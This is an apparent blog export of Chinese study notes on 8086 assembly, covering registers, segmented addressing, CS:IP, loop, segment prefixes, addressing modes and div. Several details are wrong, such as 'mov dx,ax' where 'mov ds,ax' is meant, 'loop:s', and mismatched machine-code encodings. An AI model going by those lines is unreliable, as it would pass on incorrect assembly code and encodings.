<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>8086CPU的所有寄存器都是16位的，可以存放两个字节。AX、BX、CX、DX这四个寄存器通常用来存放一般性的数据，被称为<code>通用寄存器</code>。</p>
<p>8086CPU的上一代CPU中的寄存器都是8位的，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在8086之上，上面提到的通用寄存器可分为独立使用的8位寄存器来使用：</p>
<ul>
<li>AX可分为AH和AL；</li>
<li>BX可分为BH和BL；</li>
<li>CX可分为CH和CL；</li>
<li>DX可分为DH和DL。</li>
</ul>
<p>以AX为例，AX的低8位（0<del>7位）构成了AL寄存器，高8位（8</del>15位）构成了AH寄存器。AH和AL都是可以独立使用的8位寄存器。</p>
<p><img src="https://gitee.com/auxein/images/raw/master/assembly_language/AX.png" alt="16位寄存器及所分成的两个8位寄存器的数据存储情况"></p>
<table>
<thead>
<tr>
<th align="center">寄存器</th>
<th>寄存器中的数据</th>
<th>所表示的值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">AX</td>
<td>100111000100000</td>
<td>20000(4E20H)</td>
</tr>
<tr>
<td align="center">AH</td>
<td>01001110</td>
<td>78(4EH)</td>
</tr>
<tr>
<td align="center">AL</td>
<td>00100000</td>
<td>32(20H)</td>
</tr>
</tbody></table>
<h2 id="字在寄存器中的存储"><a href="#字在寄存器中的存储" class="headerlink" title="字在寄存器中的存储"></a>字在寄存器中的存储</h2><p>出于对兼容性的考虑，8086CPU可以一次性处理以下两种尺寸的数据。</p>
<ul>
<li>字节：记为byte，一个字节由8个bit组成，可以放在8位寄存器中</li>
<li>字：记为word，一个字由两个字节组成，这两个字节分别称为这个字的高位字节和低位字节</li>
</ul>
<p>一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位和低8位寄存器中。如上图，一个<em>字型</em>数据<code>20000</code>，存在AX寄存器中，在<code>AH</code>中中存储了它的高8位，在<code>AL</code>中存了它的低8位。<code>AH</code>和<code>AL</code>中的数据，即可以看成一个字型数据的高8位和低8位，这个字型数据的大小是20000；又可以看作是两个独立的字节型数据，它们的大小分别是78和32。</p>
<h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><table>
<thead>
<tr>
<th>汇编指令</th>
<th>控制CPU完成的操作</th>
<th>用高级语言的语法去描述</th>
</tr>
</thead>
<tbody><tr>
<td>mov ax,18</td>
<td>将18送入寄存器AX</td>
<td>AX=18</td>
</tr>
<tr>
<td>mov ah，78</td>
<td>将78送入寄存器AH</td>
<td>AH=78</td>
</tr>
<tr>
<td>add ax,8</td>
<td>将寄存器AX中的数值加上8</td>
<td>AX=AX+8</td>
</tr>
<tr>
<td>mov ax,bx</td>
<td>将寄存器BX中的数据送入寄存器AX</td>
<td>AX=BX</td>
</tr>
<tr>
<td>add ax,bx</td>
<td>将AX和BX中的数值相加，结果存在AX中</td>
<td>AX=AX+BX</td>
</tr>
</tbody></table>
<p>几个错误的汇编指令实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,bl(在8位寄存器和16位寄存器之间传送数据)</span><br><span class="line">mov bh,ax(在16位寄存器和8位寄存器之间传送数据)</span><br><span class="line">mov al,20000(8位寄存器最大可存放为255的数据)</span><br><span class="line">add al,100H(将一个高于8位的数据加到一个8位寄存器中)</span><br></pre></td></tr></table></figure>

<h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>在CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间都有唯一的地址，这个唯一的地址称为<code>物理地址</code></p>
<h2 id="16位结构的CPU"><a href="#16位结构的CPU" class="headerlink" title="16位结构的CPU"></a>16位结构的CPU</h2><p>概括地讲，16位结构描述了一个CPU具有以下方面的结构特性。</p>
<ul>
<li>运算器一次最多可以处理16位的数据</li>
<li>寄存器的最大宽度为16位</li>
<li>寄存器和运算器之间的通路为16位</li>
</ul>
<h2 id="8086CPU给出物理地址的方法"><a href="#8086CPU给出物理地址的方法" class="headerlink" title="8086CPU给出物理地址的方法"></a>8086CPU给出物理地址的方法</h2><p>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。</p>
<p>8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。逻辑结构如下图：</p>
<p><img src="https://gitee.com/auxein/images/raw/master/assembly_language/address.jpg" alt="8086CPU相关部件的逻辑结构"></p>
<p>当CPU要读写内存时：</p>
<ol>
<li>CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址；</li>
<li>段地址和偏移地址通过内部总线送入一个称为地址加法器的部件； </li>
<li>地址加法器将两个16位地址合成为一个20位的物理地址；</li>
<li>地址加法器通过内部总线将20位物理地址送入输入输出控制电路；</li>
<li>输入输出控制电路将20位物理地址送上地址总线；</li>
<li>20位物理地址被地址总线传送到存储器。</li>
</ol>
<p>地址加法器采用<code>物理地址=段地址*16+偏移地址</code>的方法用段地址和偏移地址合成物理地址。例如8086CPU要访问地址为<code>123C8H</code>的内存单元。</p>
<ol>
<li>相关部件提供段地址<code>1230</code>和偏移地址<code>00C8</code></li>
<li>段地址和偏移地址送入地址加法器</li>
<li>段地址*16=<code>12300</code></li>
<li>段地址*16+偏移地址，得出物理地址=<code>123C8</code></li>
<li>输出物理地址</li>
</ol>
<h2 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h2><p>“段地址”这个名称中包含着“段”的概念。这并不是指内存被划分成了一个一个的段，每一个段都有一个段地址。</p>
<p>其实内存并没有分段，段的划分来自于CPU，由于8086CPU用“基础地址（段地址*16）+偏移地址=物理地址”的方式给出了内存单元的物理地址，使得分段的方法管理内存成为可能。我们可以认为：地址<code>10000H~100FFH</code>的内存单元组成一个段，该段的起始地址（基础地址）为<code>10000H</code>，段地址为<code>1000H</code>，大小为<code>100H</code>；我们也可以认为地址<code>10000H~1007FH</code>、<code>10080H~100FFH</code>的内存单元组成两个段，它们的起始地址为<code>10000H</code>和<code>10080H</code>，段地址为<code>1000H</code>和<code>1008H</code>，大小都为<code>80H</code>。</p>
<p>需要注意的是：段地址*16必然是16的倍数，所以一个段的起始地址也一定是16的倍数（<strong>所以基础地址的最低一位必然是0</strong>）；偏移地址为16位，16位地址的寻址能力为64KB，所以一个段的长度最大为64KB。</p>
<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>在8086CPU访问内存时要由相关部件提供内存单元的段地址和偏移地址，送入地址加法器合成物理地址。8086CPU有4个段寄存器：CS、DS、SS、ES</p>
<h2 id="CS和IP"><a href="#CS和IP" class="headerlink" title="CS和IP"></a>CS和IP</h2><p>CS和IP是8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指令指针寄存器。</p>
<p>在8086PC机中，任意时刻，设CS中的内容为M，IP中的内容为N，8086CPU将从内存<code>M*16+N</code>单元开始，读取一条指令并执行。</p>
<p>下图展示了8086CPU读取、执行指令的工作原理。<br><img src="https://gitee.com/auxein/images/raw/master/assembly_language/CSIP.jpg"></p>
<ol>
<li>8086CPU当前状态：CS中的内容为2000H，IP中的内容为0000H；</li>
<li>内存20000H~20009H单元存放着可执行的机器码；</li>
<li>内存20000H~20009H单元存放的机器码对应的汇编指令如下：</li>
</ol>
<ul>
<li>地址：20000H~20002H，内容：B8 23 01,长度：3Byte，对应汇编指令：mov ax，0123H</li>
<li>地址：20003H~20005H，内容：BB 03 00，长度：3Byte，对应汇编指令：mov bx，0123H</li>
<li>地址：20006H~20007H，内容89 D8，长度：2Byte，对应汇编指令：mov ax,bx</li>
<li>地址： 20008H~20009H，内容01 D8，长度：2Byte，对应汇编指令：add ax,bx</li>
</ul>
<p>8086CPU的工作过程可简要描述为：</p>
<ol>
<li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器；</li>
<li>IP=IP+所读取指令的长度，从而指向下一条指令；</li>
<li>执行指令。然后转到第一步，重复这个过程。</li>
</ol>
<p>在8086CPU加点启动或复位后CS和IP被设置为<code>CS=FFFFH</code>，<code>IP=0000H</code>，即在8086PC机刚启动时，CPU从内存FFFF0H单元中读取指令执行，FFFF0H单元中的指令是其开机后执行的第一条命令。</p>
<h2 id="修改CS、IP的指令"><a href="#修改CS、IP的指令" class="headerlink" title="修改CS、IP的指令"></a>修改CS、IP的指令</h2><p>在8086CPU中，大部分寄存器的值都可以通过mov指令来改变，mov指令被称为<strong>传送指令</strong>。但是CS、IP的值不能由mov指令修改。其中能修改CS、IP的一个最简单的指令是：jmp。</p>
<p>若想同时修改CS、IP的内容，使用形如“jmp 段地址:偏移地址”的指令完成，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp 2AE3：3，执行后：CS&#x3D;2AE3H，IP&#x3D;0003H，CPU将从2AE33H处读取指令</span><br><span class="line">jmp 3：0B16，执行后：CS&#x3D;0003H，IP&#x3D;0B16H，CPU将从00B46H处读取指令</span><br></pre></td></tr></table></figure>

<p>若仅想修改IP的内容，可用形如”jmp 某一合法寄存器”的指令完成，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp ax，指令执行前：ax&#x3D;1000H，CS&#x3D;2000H，IP&#x3D;0003H</span><br><span class="line">        指令执行后：ax&#x3D;1000H，CS&#x3D;2000H，IP&#x3D;1000H</span><br></pre></td></tr></table></figure>

<h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N（N≤64KB）的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，我们可以认为这段内存是用来存放代码的，从而便定义了一个代码段。</p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（五）</title>
    <url>/2021/02/21/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（五）"><a href="#汇编语言学习（五）" class="headerlink" title="汇编语言学习（五）"></a>汇编语言学习（五）</h1><p>1.[bx]和内存单元的描述</p>
<p>[bx]与[0]类似，[0]表示内存单元，它的偏移地址是0，段地址默认在ds中，单元的长度（类型）可以由具体指令中的其他操作对象（比如说寄存器）指出。</p>
<p>[bx]同样表示一个内存单元，它的偏移地址在bx中，段地址默认在ds中，单元的长度（类型）可以由具体指令中的其他操作对象（比如说寄存器）指出。</p>
<p>2.loop</p>
<p>本篇将讲述关于[bx]和loop指令的应用、意义和相关的内容。</p>
<p>3.定义的一个描述性符号：“()”</p>
<p>“()”表示一个寄存器或一个内存单元中的内容。</p>
<p>4.约定符号idata表示常量</p>
<h2 id="BX"><a href="#BX" class="headerlink" title="[BX]"></a>[BX]</h2><p><code>mov ax, [bx]</code></p>
<p>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将<code>SA:EA</code>处的数据送入ax中。即：<code>(ax)=((ds)*16+(bx))</code></p>
<p><code>mov [bx],ax</code></p>
<p>功能：bx中存放的数据作为一个偏移地址EA，段地址默认在ds中，将ax中的数据送入内存<code>SA:EA</code>处。即((ds)*16+(bx))=ax</p>
<h2 id="Loop指令"><a href="#Loop指令" class="headerlink" title="Loop指令"></a>Loop指令</h2><p>loop指令的格式是：loop标号，CPU执行loop指令的时候，要进行两步操作：</p>
<ol>
<li>(cx)=(cx)-1;</li>
<li>判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。</li>
</ol>
<p>通常使用loop指令来实现循环功能时，cx中存放循环次数。</p>
<p>计算2^12需要11条重复的指令add ax,ax</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,2</span><br><span class="line"></span><br><span class="line">    mov cx,11</span><br><span class="line">s: add ax,ax</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>分析程序：</p>
<ol>
<li>标号<blockquote>
<p>在汇编程序中，标号代表一个地址，上面有一个标号s。它实际上标识了一个地址，这个地址处有一条指令：add ax,ax</p>
</blockquote>
</li>
<li>loop s</li>
<li>三条指令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    mov cx,11</span><br><span class="line">s:  add ax,ax</span><br><span class="line">    loop s</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>执行<code>loop s</code>时，首先要将(cx)减一，然后若(cx)不为0，则向前转至s处执行<code>add ax,ax</code>。所以，可以利用cx来控制<code>add ax,ax</code>的执行过程</p>
</blockquote>
<h2 id="loop和-bx-的联合应用"><a href="#loop和-bx-的联合应用" class="headerlink" title="loop和[bx]的联合应用"></a>loop和[bx]的联合应用</h2><p>考虑这样的一个问题：计算<code>ffff:0~ffff:b</code>单元中的数据的和，结果存储在dx中。</p>
<blockquote>
<p><code>ffff:0~ffff:b</code>内存单元中的数据是字节型数据，范围在0~255之间，12个这样的数据相加，结果不会大于65535，可以在dx中存放下</p>
</blockquote>
<blockquote>
<p><code>ffff:0~ffff:b</code>中的数据是8位，dx是16位寄存器，不能直接累加到dx中</p>
</blockquote>
<blockquote>
<p>也不能将<code>ffff:0~ffff:b</code>中的数据累加到dl中，并置(dh)=0，dl是8位寄存器，能容纳的数据范围在0<del>255之间，`ffff:0</del>ffff:b`中的数据也都是8位，如果仅向dl中累加12个8位数据，很有可能造成进位丢失</p>
</blockquote>
<p>采用的方法：使用一个16位寄存器作为中介，将内存单元中的8位数据赋值到一个16位寄存器ax中，再将ax中的数据累加到dx上，从而使两个运算对象的类型匹配并且不会超界。</p>
<p>程序如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    mov ax,0ffffh</span><br><span class="line">    mov dx,ax</span><br><span class="line">    mov bx,0        </span><br><span class="line">                        ;初始化ds：bx指向ffff:0</span><br><span class="line">    mov dx,0</span><br><span class="line">                        ;初始化累加寄存器dx，(dx)&#x3D;0</span><br><span class="line">    mov cx,12</span><br><span class="line">                        ;初始化循环计数寄存器cx,(cx)&#x3D;12</span><br><span class="line">s:  mov al,[bx]</span><br><span class="line">    mov ah,0</span><br><span class="line">    add dx,ax           ;间接向dx中加上((ds)*16+(bx))单元的数值</span><br><span class="line">    inc bx              ;ds:bx指向下一个单元</span><br><span class="line">    loop:s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h2 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h2><p>我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器。</p>
<ol>
<li><p><code>mov ax,ds:[bx]</code><br>将一个内存单元的内容送入<code>ax</code>，这个内存单元的长度为2字节（字单元），存放一个字，偏移地址在<code>bx</code>中，段地址在<code>ds</code>中</p>
</li>
<li><p><code>mov ax,cs:[bx]</code></p>
</li>
<li><p><code>mov ax,ss:[bx]</code></p>
</li>
<li><p><code>mov ax,es:[bx]</code></p>
</li>
<li><p><code>mov ax,ss:[0]</code></p>
</li>
<li><p><code>mov ax,cs:[0]</code></p>
</li>
</ol>
<p><code>ds:</code>、<code>cs:</code>、<code>ss:</code>、<code>es:</code>等用于显式地指明内存单元的段地址，在汇编语言中被称为段前缀。</p>
<h2 id="段前缀的使用"><a href="#段前缀的使用" class="headerlink" title="段前缀的使用"></a>段前缀的使用</h2><p>将内存<code>ffff:0~ffff:b</code>单元中的数据复制到<code>0:200~0:20b</code>单元中</p>
<p><code>0:200~0:20b</code>等同于<code>0020:0~0020:b</code>单元</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    mov ax,0ffffh</span><br><span class="line">    mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov ax,0020h</span><br><span class="line">    mov es,ax</span><br><span class="line"></span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span class="line">    mov cx,12</span><br><span class="line"></span><br><span class="line">s:  mov dl,[bx]</span><br><span class="line">    mov es:[bx],dl</span><br><span class="line">    inc bx</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（八）</title>
    <url>/2021/03/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（八）"><a href="#汇编语言学习（八）" class="headerlink" title="汇编语言学习（八）"></a>汇编语言学习（八）</h1><p>定义描述性符号：<code>reg</code>和<code>sreg</code></p>
<p><code>reg</code>的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di</p>
<p><code>sreg</code>的集合包括：ds、ss、cs、es</p>
<h2 id="bx、si、di和bp"><a href="#bx、si、di和bp" class="headerlink" title="bx、si、di和bp"></a>bx、si、di和bp</h2><p>在[…]中，bx、si、di、bp这四个寄存器可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di</p>
<p>并且若只使用bp，而指令中没有显式地给出段地址，段地址就默认在ss中。如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bp]         (ax)&#x3D;((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+idata]   (ax)&#x3D;((ss)*16+(bp)+idata)</span><br><span class="line">mov ax,[bp+si]      (ax)&#x3D;((ss)*16+(bp)+(si))</span><br><span class="line">mov ax,[bp+si+idata]    (ax)&#x3D;((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></table></figure>

<h2 id="机器指令处理的数据在什么地方"><a href="#机器指令处理的数据在什么地方" class="headerlink" title="机器指令处理的数据在什么地方"></a>机器指令处理的数据在什么地方</h2><p>指令在执行前，所要处理的数据可以在三个地方：CPU内部、内存、端口</p>
<table>
<thead>
<tr>
<th>机器码</th>
<th>汇编指令</th>
<th>指令执行前数据的位置</th>
</tr>
</thead>
<tbody><tr>
<td>8E1E0000</td>
<td>mov bx,[0]</td>
<td>内存，ds:0单元</td>
</tr>
<tr>
<td>89C3</td>
<td>mov bx,ax</td>
<td>CPU内部，ax寄存器</td>
</tr>
<tr>
<td>BB0100</td>
<td>mov bx,1</td>
<td>CPU内部，指令缓存器</td>
</tr>
</tbody></table>
<h2 id="汇编语言中数据位置的表达"><a href="#汇编语言中数据位置的表达" class="headerlink" title="汇编语言中数据位置的表达"></a>汇编语言中数据位置的表达</h2><p>汇编语言中用三个概念来表达数据的位置</p>
<ol>
<li>立即数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add bx,2000h</span><br><span class="line">or bx,0001000b</span><br><span class="line">mov al,&#39;a&#39;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>寄存器</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,bx</span><br><span class="line">mov ds,ax</span><br><span class="line">push bx</span><br><span class="line">mov ds:[0],bx</span><br><span class="line">push ds</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,ax</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>段地址（SA）和偏移地址（EA）</li>
</ol>
<p>存放段地址的寄存器可以是默认的，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[0]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bx+8]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+si+8]</span><br></pre></td></tr></table></figure>

<p>以上指令段地址默认在ds中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[bp+8]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+si+8]</span><br></pre></td></tr></table></figure>

<p>以上指令段地址默认在ss中</p>
<p>存放段地址的寄存器也可以是显性给出的，比如以下的指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,ds:[bp]</span><br><span class="line">mov ax,es:[bx]</span><br><span class="line">mov ax,ss:[bx+si]</span><br><span class="line">mov ax,cs:[bx+si+8]</span><br></pre></td></tr></table></figure>


<h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><table>
<thead>
<tr>
<th>寻址方式</th>
<th>含义</th>
<th>名称</th>
<th>常用格式举例</th>
</tr>
</thead>
<tbody><tr>
<td>[idata]</td>
<td>EA=idata;SA=(ds)</td>
<td>直接寻址</td>
<td>[idata]</td>
</tr>
<tr>
<td>[bx]</td>
<td>EA=(bx);SA=(ds)</td>
<td>寄存器间接寻址</td>
<td>[bx]</td>
</tr>
<tr>
<td>[si]</td>
<td>EA=(si);SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[di]</td>
<td>EA=(di);SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp]</td>
<td>EA=(bp);SA=(ss)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bx+idata]</td>
<td>EA=(bx)+idata;SA=(ds)</td>
<td>寄存器相对寻址</td>
<td>用于结构体:[bx].idata；用于数组：idata[si],idata[di]；用于二维数组:[bx][idata]</td>
</tr>
<tr>
<td>[si+idata]</td>
<td>EA=(si)+idata;SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[di+idata]</td>
<td>EA=(di)+idata;SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp+idata]</td>
<td>EA=(bp)+idata;SA=(SS)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bx+si]</td>
<td>EA=(bx)+(si);SA=(ds)</td>
<td>基址变址寻址</td>
<td>用于二维数组[bx][si]</td>
</tr>
<tr>
<td>[bx+di]</td>
<td>EA=(bx)+(di);SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp+si]</td>
<td>EA=(bp)+(si);SA=(ss)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp+di]</td>
<td>EA=(bp)+(di);SA=(ss)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bx+si+idata]</td>
<td>EA=(bx)+(si)+idata;SA=(ds)</td>
<td>相对基址变址寻址</td>
<td>用于表格中的数据项：[bx].idata[si] 用于二维数组：idata[bx][si]</td>
</tr>
<tr>
<td>[bx+di+idata]</td>
<td>EA=(bx)+(di)+idata;SA=(ds)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp+si+idata]</td>
<td>EA=(bp)+(si)+idata;SA=(ss)</td>
<td>^</td>
<td>^</td>
</tr>
<tr>
<td>[bp+di+idata]</td>
<td>EA=(bp)+(di)+idata;SA=(ss)</td>
<td>^</td>
<td>^</td>
</tr>
</tbody></table>
<h2 id="指令处理的数据长度"><a href="#指令处理的数据长度" class="headerlink" title="指令处理的数据长度"></a>指令处理的数据长度</h2><ol>
<li><p>通过寄存器名指明要处理的数据的尺寸</p>
</li>
<li><p>在没有寄存器名存在的情况下，用操作符<code>X ptr</code>指明内存单元的长度，X在汇编指令中可以为word或byte</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br><span class="line"></span><br><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他方法</li>
</ol>
<p>有些指令默认了访问的是字单元还是字节单元。比如<code>push</code>默认就是字操作</p>
<h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><p>div是除法指令，使用时应注意以下问题</p>
<ol>
<li>除数：有8位和16位两种，在一个reg或内存单元中</li>
<li>被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位</li>
<li>结果：如果除数为8位，则AL存储除法操作的商，AH存储出发操作的余数；如果除数为16位，则AX存放除法操作的商，DDX存放除法操作的余数</li>
</ol>
<p>格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div byte ptr ds:[0]</span><br><span class="line">;(al)&#x3D;(ax)&#x2F;((ds)*16 + 0)的商</span><br><span class="line">;(ah)&#x3D;(ax)&#x2F;((ds)*16 + 0)的余数</span><br><span class="line"></span><br><span class="line">div word ptr es:[0]</span><br><span class="line">;(ax)&#x3D;[(dx)*10000H+(ax)]&#x2F;((es)*16 + 0)的商</span><br><span class="line">;(dx)&#x3D;[(dx)*10000H+(ax)]&#x2F;((es)*16 + 0)的余数</span><br></pre></td></tr></table></figure>

<h2 id="伪指令dd"><a href="#伪指令dd" class="headerlink" title="伪指令dd"></a>伪指令dd</h2><p>dd是用来定义dword（double word，双字）型数据的。</p>
<h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p>dup是一个操作符，在汇编语言中同<code>db、dw、dd</code>等一样，也是由编译器识别处理的符号。它和<code>db、dw、dd</code>等数据定义伪指令配合使用的，用来进行数据的重复。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db 3 dup(0)</span><br></pre></td></tr></table></figure>

<p>定义了三个字节，它们的值都是0，相当于<code>db 0,0,0</code></p>
<p>dup是一个十分有用的操作符，比如要定义一个容量位200个字节的栈段，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stack segment</span><br><span class="line">    db 200 dup (0)</span><br><span class="line">stack ends</span><br></pre></td></tr></table></figure>







]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（六）</title>
    <url>/2021/02/26/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（六）"><a href="#汇编语言学习（六）" class="headerlink" title="汇编语言学习（六）"></a>汇编语言学习（六）</h1><p>前面的程序中只有一个代码段。而如果程序需要用其他空间来存放数据又使用哪里？</p>
<p><code>0:200~0:2FF</code>是相对安全的，但是这段空间只有256个字节。</p>
<p>在操作系统的环境中，合法地通过操作系统取得地空间都是安全的，因为操作系统不会让一个程序所用的空间和其他程序以及系统自己的空间相冲突。在操作系统允许的情况下，程序可以取得任意容量的空间。</p>
<p>程序取得所需空间的方法有两种，一是在加载程序的时候为程序分配，再就是程序在执行的过程中向系统申请。</p>
<p>若要一个程序在被加载的时候取得所需的空间，则必须要在源程序中做出说明。通过在源程序中定义段来进行内存空间的获取。</p>
<h2 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line"></span><br><span class="line">    mov bx,0</span><br><span class="line">    mov ax,0</span><br><span class="line"></span><br><span class="line">    mov cx,8</span><br><span class="line"></span><br><span class="line">s:  add ax,cs:[bx]</span><br><span class="line">    add bx,2</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>解释一下，<code>dw</code>的含义是定义字型数据。<code>dw</code>即“define word”。这里使用<code>dw</code>定义了8个字型数据，它们所占的内存空间的大小为16个字节。</p>
<p>程序在运行的时候CS存放代码段的段地址，所以可以从CS中得到这8个数据的段地址。而使用<code>dw</code>定义的数据储与代码段的最开始，所以偏移地址为0。这八个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时它们的地址就是<code>CS:0</code>、<code>CS:2</code>、<code>CS:4</code>、<code>CS:6</code>、<code>CS:8</code>、<code>CS:A</code>、<code>CS:C</code>、<code>CS:E</code></p>
<p>程序中，用bx存放2递增的偏移地址，用循环来进行累加。在循环开始前，设置(bx)=0,<code>cs:bx</code>指向第一个数据所在的字单元。每次循环中<code>(bx)=(bx)+2</code>，<code>cs:bx</code>指向下一个数据所在的字单元。</p>
<p>然而这样直接编译成程序可能会出现问题，因为程序的入口不是我们所希望执行的指令。我们可以通过在源程序中指明程序的入口所在来使得程序在编译后可以在系统中直接运行。</p>
